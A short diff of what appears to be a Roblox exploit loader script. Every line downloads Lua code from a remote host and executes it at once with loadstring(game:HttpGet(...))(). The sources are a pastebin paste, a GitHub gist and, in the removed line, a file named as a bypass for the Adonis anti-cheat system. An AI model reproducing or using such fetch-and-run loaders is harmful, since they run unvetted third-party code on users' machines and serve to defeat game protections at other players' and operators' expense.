@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CongoOhioDog/automatic-spork/main/Adonis%20Bypass.lua"))()
-
 loadstring(game:HttpGet("https://pastebin.com/raw/RY4WhKnW", true))()
 
 loadstring(game:HttpGet("https://gist.githubusercontent.com/Nothingnesser1/4d874218d64fa8599b03784953dc0e19/raw/2f94ec59550e82bffadd8e7192c2781fa16ab799/main%2520Script"))()
